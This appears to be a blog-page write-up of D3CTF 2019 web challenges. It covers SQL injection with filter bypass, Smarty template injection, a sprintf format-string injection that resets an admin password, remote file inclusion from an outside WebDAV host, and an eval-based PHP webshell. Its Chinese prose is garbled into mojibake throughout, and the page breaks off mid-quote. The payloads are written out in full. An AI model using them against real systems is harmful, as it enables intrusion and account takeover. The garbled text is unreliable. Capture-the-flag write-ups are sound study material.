<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="D3CTF-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2019/11/26/D3CTF-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="D3CTF-wp">
<meta property="og:url" content="https://glotozz.github.io/2019/11/26/D3CTF-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/qIxLCwfBK4b8tRJ.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/pvTWwzKPxAMXraD.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/RgavbGS1IrlcLY2.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/oSALxDdkE56BqhI.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/lUXhg58DAzZvqE7.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/4iXy9vYBLNCxzRS.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/vk7JDuUYeZr5QtO.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/Vaqm1RjSAtCU5IP.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/M7XhCpt1K3wOBxV.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/y97qzOjZBger2nT.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/HGcu6t2QxeE849q.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/uIWkiTpn4RDHYs1.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/1oGSUnZ65fmLchB.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/jOAfIrg1wGkTdDp.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/rw69ecdvmVfzKhq.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/IhSqxMZue3bE62K.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/zQuNSM6aDphtjGT.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/28KSVWq54begcR9.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/PkJlfyXTe194CzS.png">
<meta property="og:image" content="https://i.loli.net/2019/11/26/swkdhnaJBEHAI1Y.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/RzdyHS7uTvVl5k2.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/vSKFjUPlu7RcLWy.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/TNi5XDZfraV6Rmb.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/6kdWOJgIhsQ285x.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/YaWvmLp3OUBqtJ6.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/RguSfOekB6i4rQL.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/vdVAHwKnIbmN6pc.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/M3xAYDjqUwGeQgC.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/oEMqHGc9VDJNvrX.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/l3hdoCLcsYvGqrU.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/4e2nM9P8QAtsRjU.png">
<meta property="og:image" content="https://i.loli.net/2019/11/27/2xOCqmYKzutWy4d.png">
<meta property="article:published_time" content="2019-11-26T00:01:11.000Z">
<meta property="article:modified_time" content="2020-04-10T13:30:18.501Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> D3CTF-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          D3CTF-wp
        
      </h1>

      <time class="post-time">
          Nov 26 2019
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>ç®€é™‹çš„ç›®å½•</strong></p>
<!-- toc -->

<ul>
<li><a href="#easyweb">easyweb</a></li>
<li><a href="#showhub">Showhub</a></li>
<li><a href="#fakeonlinephp">fakeonlinephp</a></li>
<li><a href="#ezupload">ezupload</a></li>
<li><a href="#ezts">ezts</a></li>
<li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥:</a></li>
</ul>
<!-- tocstop -->

<hr>
<p><strong>è¶ç€D^3CTFç¯å¢ƒè¿˜æ²¡å…³ï¼Œèµ¶ç´§å¤ç°ä¸€ä¸‹</strong></p>
<h3><span id="easyweb">easyweb</span></h3><p>è¿™é¢˜ç»™å‡ºäº†æºç ï¼Œä»£ç å®¡è®¡</p>
<p>æ¼æ´è§¦å‘ç‚¹åœ¨<code>controllers/user.php</code></p>
<p><img src="https://i.loli.net/2019/11/26/kKqbvXgzCaMj2D6.png" alt="Snipaste_2019-11-26_08-26-58.png"></p>
<p>è·Ÿè¸ª<code>get_view()</code></p>
<p><img src="https://i.loli.net/2019/11/26/qIxLCwfBK4b8tRJ.png" alt="Snipaste_2019-11-26_08-28-15.png"></p>
<p>è·Ÿè¸ª<code>sql_safe()</code>å’Œ<code>safe_render()</code></p>
<p><img src="https://i.loli.net/2019/11/26/pvTWwzKPxAMXraD.png" alt="Snipaste_2019-11-26_08-29-29.png"></p>
<p>éå¸¸æ˜æ˜¾çš„åˆ©ç”¨ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨<code>$username</code>æ³¨å…¥çš„æ—¶å€™åŠ ä¸Š<code>{</code>ç»•è¿‡è¿‡æ»¤å³å¯</p>
<p>ç®€å•æµ‹è¯•ä¸€ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&#39;un&#123;ion se&#123;lect 666 limit 1,1#</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>666</code></p>
<p>ç„¶åæ•°æ®åº“ä¸­å¹¶æ²¡æœ‰flagï¼Œ</p>
<p>å› ä¸ºæ˜¯<code>smarty</code>æ¸²æŸ“æ¨¡ç‰ˆï¼Œå°è¯•æ¨¡ç‰ˆæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$smarty.version&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D limit 1,1#</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾—ä½¿ç”¨å‡½æ•°ã€‚ã€‚ã€‚</p>
<p><img src="https://i.loli.net/2019/11/26/RgavbGS1IrlcLY2.png" alt="Snipaste_2019-11-26_12-59-19.png"></p>
<p><img src="https://i.loli.net/2019/11/26/oSALxDdkE56BqhI.png" alt="Snipaste_2019-11-26_13-32-21.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#x2F;php&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect </span><br><span class="line">0x7b7068707d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b2f7068707d limit 1,1#</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸è¡Œï¼Œéœ€è¦ç”¨ä¸¤ä¸ªå¤§æ‹¬å·åŒ…è£¹ï¼Œå¯èƒ½æ˜¯è¢«æ¸²æŸ“ä¸€æ¬¡åä¼šå°‘ä¸€ä¸ªï¼Œå…·ä½“ç­‰ä¸‹æ¬¡æœ¬åœ°æ­å»ºä¸€ä¸‹<code>smarty</code>æ¨¡æ¿æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;php&#125;&#125;include(&#39;&#x2F;tmp&#x2F;6f9d434a1cb7d9a0cccc6469186e777b&#x2F;eval.jpg&#39;);&#123;&#123;&#x2F;php&#125;&#125;</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">g&#39;un&#123;ion se&#123;lect 0x7b7b7068707d7d696e636c75646528272f746d702f36663964343334613163623764396130636363633634363931383665373737622f6576616c2e6a706727293b7b7b2f7068707d7d limit 1,1#</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/26/lUXhg58DAzZvqE7.png" alt="TIMå›¾ç‰‡20191126133546.png"></p>
<p><strong>æœ‰æ—¶é—´è‡ªå·±æ­ä¸€ä¸‹smartyç¯å¢ƒå¤ç°</strong></p>
<h3><span id="showhub">Showhub</span></h3><p>ç»™äº†æºç ã€‚ã€‚ã€‚å¾ˆå¤šæ—¶å€™çœ‹åˆ°æºç å°±ä¼šç´§å¼ ï¼Œä½†å…¶å®è¿™é‡Œæ–‡ä»¶ä¹Ÿä¸å¤š</p>
<p>é—®é¢˜å‡ºç°åœ¨<code>Models/Model.php</code></p>
<p><img src="https://i.loli.net/2019/11/26/4iXy9vYBLNCxzRS.png" alt="Snipaste_2019-11-26_13-40-26.png"></p>
<p><code>sprintf()</code>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹å‰ä¹Ÿé‡åˆ°è¿‡</p>
<blockquote>
<p>å‚è€ƒé“¾æ¥ï¼š <a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a> </p>
<p>sprintf(format,arg1,arg2,arg++) </p>
<p>arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨ã€‚</p>
<p>æ³¨é‡Šï¼šå¦‚æœ % ç¬¦å·å¤šäº arg å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ â€œ$â€œ ç»„æˆã€‚</p>
</blockquote>
<p>ä¸¾ä¸ªæ —å­</p>
<p><img src="https://i.loli.net/2019/11/26/vk7JDuUYeZr5QtO.png" alt="Snipaste_2019-11-26_14-01-39.png"></p>
<p>ç„¶åæ˜¯çœ‹æºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">switch (format[inpos]) &#123;</span><br><span class="line">case &#39;s&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        zend_string * t;</span><br><span class="line">        zend_string * str &#x3D; zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0);</span><br><span class="line">        zend_tmp_string_release(t);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign);</span><br><span class="line">    break;</span><br><span class="line">case &#39;u&#39;:</span><br><span class="line">    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment);</span><br><span class="line">    break;</span><br><span class="line">case &#39;g&#39;:</span><br><span class="line">case &#39;G&#39;:</span><br><span class="line">case &#39;e&#39;:</span><br><span class="line">case &#39;E&#39;:</span><br><span class="line">case &#39;f&#39;:</span><br><span class="line">case &#39;F&#39;:</span><br><span class="line">    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);</span><br><span class="line">    break;</span><br><span class="line">case &#39;c&#39;:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp));</span><br><span class="line">    break;</span><br><span class="line">case &#39;o&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;x&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;X&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;b&#39;:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec);</span><br><span class="line">    break;</span><br><span class="line">case &#39;%&#39;:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, &#39;%&#39;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ phpæºç ä¸­åªå¯¹15ç§ç±»å‹åšäº†åŒ¹é…ï¼Œ å…¶ä»–å­—ç¬¦ç±»å‹éƒ½ç›´æ¥breakäº†ï¼Œphpæœªåšä»»ä½•å¤„ç†ï¼Œç›´æ¥è·³è¿‡ï¼Œæ‰€ä»¥å¯¼è‡´äº†è¿™ä¸ªé—®é¢˜ï¼š</p>
<p>æ²¡åšå­—ç¬¦ç±»å‹æ£€æµ‹çš„æœ€å¤§å±å®³å°±æ˜¯å®ƒå¯ä»¥åƒæ‰ä¸€ä¸ªè½¬ä¹‰ç¬¦, å¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª,é‚£ä¹ˆphpä¼šæŠŠ\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰, æœ€å%\ï¼ˆæˆ–%1$\ï¼‰è¢«æ›¿æ¢ä¸ºç©º</p>
</blockquote>
<p>é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šæ¥ï¼Œå› ä¸ºæˆ‘ä»¬è¦é€ƒé€¸å•å¼•å·ï¼Œé‚£ä¹ˆåŠ¿å¿…%ç¬¦å·å¤šä½™argå‚æ•°ï¼Œè€ƒè™‘ä½¿ç”¨<code>%1$\</code>ï¼Œä»è€Œé€ƒé€¸è¿™é‡Œ<code>addslashes()</code>æ·»åŠ çš„<code>\</code></p>
<p>æ„é€ </p>
<p><img src="https://i.loli.net/2019/11/26/Vaqm1RjSAtCU5IP.png" alt="Snipaste_2019-11-26_14-47-26.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œadminå¯†ç æ˜¯sha256åŠ å¯†çš„ï¼Œå³ä½¿çˆ†ç ´å‡ºæ¥äº†ä¹Ÿæ— æµäºäº‹ï¼Œæç¤ºä¿®æ”¹å¯†ç </p>
<blockquote>
<p>åˆ©â½¤<code>ON DUPLICATE KEY UPDATE</code> ,å½“insertå·²ç»å­˜åœ¨çš„è®°å½•æ—¶ï¼Œæ‰§â¾Update<br>ç”¨ä¸‹é¢çš„å½“ç”¨æˆ·å, å¯†ç éšä¾¿, æ³¨å†Œ</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;)</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¾ˆæˆåŠŸ</p>
<p><img src="https://i.loli.net/2019/11/26/M7XhCpt1K3wOBxV.png" alt="Snipaste_2019-11-26_14-56-48.png"></p>
<p>è¿™é‡Œæ³¨å†Œå®Œç›´æ¥å°±ç™»å½•è¿›å»äº†ã€‚ã€‚ã€‚åº”è¯¥æ˜¯æ ¹æ®æ³¨å†Œæ—¶çš„ç”¨æˆ·åæŠŠ</p>
<p>ä¸çŸ¥é“ä¸ºå•¥é€€å‡ºå†ç™»å½•ä¼šå¤±è´¥ã€‚ã€‚ã€‚</p>
<p>ä¸‹ä¸€æ­¥æ˜¯åˆ©ç”¨<code>HTTPè¯·æ±‚èµ°ç§æ”»å‡»</code></p>
<blockquote>
<p>å‚è€ƒé“¾æ¥ï¼š <a href="https://mengsec.com/2019/10/10/http-request-smugging/" target="_blank" rel="noopener">https://mengsec.com/2019/10/10/http-request-smugging/</a> </p>
</blockquote>
<p><code>CL-TE</code></p>
<p>å¯èƒ½ç”±äºæˆ‘ä¸Šä¸€æ­¥ä¸æ˜¯ç›´æ¥ç™»å½•çš„ï¼Œå¯¼è‡´ä¹Ÿæ²¡æˆåŠŸ</p>
<p>===========================</p>
<p>å¤±è´¥çš„åŸå› å¯èƒ½æ˜¯å‘çš„æ¬¡æ•°ä¸å¤Ÿå¤šï¼Œä¸‹æ¬¡ç”¨bpçš„<code>intruder</code>å‘åŒ…</p>
<blockquote>
<p>è¿™é¢˜çš„æ£€æµ‹åº”è¯¥æ˜¯åœ¨ä¸­é—´ä»£ç†ATSæœåŠ¡å™¨ï¼Œé€šè¿‡æ£€æµ‹æ‰å°†è¯·æ±‚è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚æ‰€ä»¥æˆ‘ä»¬ç™»é™†adminåï¼Œç›´æ¥è®¿é—®<code>/WebConsole</code>æ˜¯æ— æ³•é€šè¿‡ä¸­é—´ä»£ç†çš„æ£€æµ‹çš„ã€‚ä½†æ˜¯å› ä¸ºæ£€æµ‹æ˜¯ä¸­é—´ä»£ç†ï¼Œåç«¯æœåŠ¡å™¨æ˜¯æ— æ¡ä»¶ç›¸ä¿¡ä¸­é—´ä»£ç†è½¬å‘çš„åŒ…çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡èµ°ç§çš„æ–¹å¼å°†æƒ³è¦çš„æ•°æ®åŒ…é€šè¿‡ä»£ç†è½¬å‘ç»™åç«¯æœåŠ¡å™¨ã€‚ </p>
</blockquote>
<h3><span id="fakeonlinephp">fakeonlinephp</span></h3><p><img src="https://i.loli.net/2019/11/26/y97qzOjZBger2nT.png" alt="Snipaste_2019-11-26_16-12-55.png"></p>
<p>å¼€å§‹ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œå‘ç°ç¯å¢ƒç»å¸¸ä¼š404ã€‚ã€‚ã€‚åº”è¯¥å°±æ˜¯ä¸ºäº†é˜²æ­¢ç”¨åŸè§£</p>
<blockquote>
<p>å‚è€ƒç¿”å“¥çš„åšæ³•ï¼š <a href="https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/#fakeonlinephp</a> </p>
</blockquote>
<p>è¿™é‡Œæ˜¯<code>windowsç³»ç»Ÿ</code>ï¼Œ</p>
<blockquote>
<p>æ­£å¸¸æƒ…å†µä¸‹æ— æ³•è¿œç¨‹åŒ…å«ï¼Œä½†æ˜¯å› ä¸ºæ˜¯windowsï¼Œå¯ä»¥ç»•è¿‡<code>allow_url_include</code>çš„é™åˆ¶<code>RFI</code>ï¼Œå‚è€ƒï¼š  <a href="https://byqiyou.github.io/2019/05/15/bypass-RFIé™åˆ¶çš„ä¸€äº›æ€è·¯/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
</blockquote>
<p>é¦–å…ˆå¯ç”¨<code>WebDAV</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~&#x2F;webdav:&#x2F;var&#x2F;lib&#x2F;dav -e ANONYMOUS_METHODS&#x3D;GET,OPTIONS,PROPFIND -e LOCATION&#x3D;&#x2F;webdav -p 80:80 --rm --name webdav bytemark&#x2F;webdav</span><br></pre></td></tr></table></figure>

<p> å¯ç”¨ååœ¨<code>~/webdav/data</code>ä¸‹æ”¾ç½®<code>phpæ–‡ä»¶</code></p>
<p>åŒ…å«</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orange&#x3D;&#x2F;&#x2F;59.110.164.44&#x2F;&#x2F;webdav&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/26/HGcu6t2QxeE849q.png" alt="Snipaste_2019-11-26_15-53-31.png"></p>
<p>å°è¯•å†™å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">	@eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ²¡ååº”ã€‚ã€‚å˜å½¢è¯•è¯•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">    @eval(($_POST)&#123;cmd&#125;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸï¼Œç”¨èšå‰‘è¿</p>
<p>ä½†æ˜¯é‡Œé¢çš„æ–‡ä»¶å†…å®¹æ˜¯ä¹±ç ã€‚ã€‚ã€‚</p>
<p><img src="https://i.loli.net/2019/11/26/uIWkiTpn4RDHYs1.png" alt="Snipaste_2019-11-26_16-41-08.png"></p>
<p>ä¿®æ”¹ä¸‹ç¼–ç å™¨æˆåŠŸ</p>
<p>è¿™é‡Œå†å›å»çœ‹çœ‹<code>phpinfo()</code>ï¼Œæ­£å¥½å‰å¤©å­¦ä¹ çœ‹æ–‡ç« å«–äº†ä¸ªå·¥å…·ğŸ˜</p>
<blockquote>
<p><a href="https://github.com/proudwind/phpinfo_scanner" target="_blank" rel="noopener">https://github.com/proudwind/phpinfo_scanner</a> </p>
</blockquote>
<p><img src="https://i.loli.net/2019/11/26/1oGSUnZ65fmLchB.png" alt="Snipaste_2019-11-26_16-25-17.png"></p>
<p>åˆ©ç”¨èšå‰‘çš„æ’ä»¶æ‰«æå†…ç½‘ç«¯å£</p>
<p><img src="https://i.loli.net/2019/11/26/jOAfIrg1wGkTdDp.png" alt="Snipaste_2019-11-26_16-27-30.png"></p>
<p><code>.git</code>æ³„éœ²</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_extract.py http:&#x2F;&#x2F;3f2b604603.fakeonelinephp.d3ctf.io&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>

<p><code>hint2.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.24 ğŸŒ§ï¸</span><br><span class="line">è¿™å°ğŸ’»è·‘ç€webæœåŠ¡ï¼Œä¸ºäº†é˜²æ­¢å¤§é»‘é˜”ç”¨nginx 0dayé»‘æˆ‘ç”µè„‘æ‹¿flagï¼ŒğŸ‘´æŠŠflagæ”¾åˆ°äº†å†…ç½‘çš„ğŸ’»ä¸Š(172.19.97.8 C:\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/26/rw69ecdvmVfzKhq.png" alt="Snipaste_2019-11-26_17-06-29.png"></p>
<p>è¿˜ç»™äº†ä¸ªå­—å…¸</p>
<blockquote>
<p>æ˜¾ç„¶éœ€è¦æˆ‘ä»¬çˆ†ç ´å¯†ç è¿›å…¥å†…ç½‘</p>
<p>è€Œä¹‹å‰å°±é€šè¿‡æ‰«æå‘ç°è¿™å°å†…ç½‘ä¸»æœº<strong>172.19.97.8</strong>æ˜¯å¼€æ”¾445ç«¯å£SMBæœåŠ¡çš„ï¼Œè€Œä¸”ç»™äº†å­—å…¸ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä¸Šä¼ <strong>hydra</strong>å·¥å…·åè¿›è¡Œçˆ†ç ´å¯†ç å³å¯ï¼š</p>
</blockquote>
<p>ä¸Šä¼ <code>hydra</code>ï¼Œä¸€å¼€å§‹ä¸è¡Œï¼Œæ¢äº†ä¸ªç›®å½•æˆåŠŸäº†</p>
<p>ä½†æ˜¯è™šæ‹Ÿç»ˆç«¯ä»ç„¶æ‰§è¡Œä¸äº†å‘½ä»¤ã€‚ã€‚ã€‚ã€‚ç¿”å“¥è¯´ç”¨linuxçš„å¯ä»¥ğŸ‘</p>
<p>é‚£ä¹ˆkaliä¸­å®‰è£…antsowrdï¼Œä¸€å¼€å§‹å‚è€ƒç½‘ä¸Šçš„èŠ±äº†ä¸€äº›æ—¶é—´åˆ©ç”¨nodejså‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œè¿˜æ˜¯å‚è€ƒå®˜æ–¹githubçš„é è°±</p>
<blockquote>
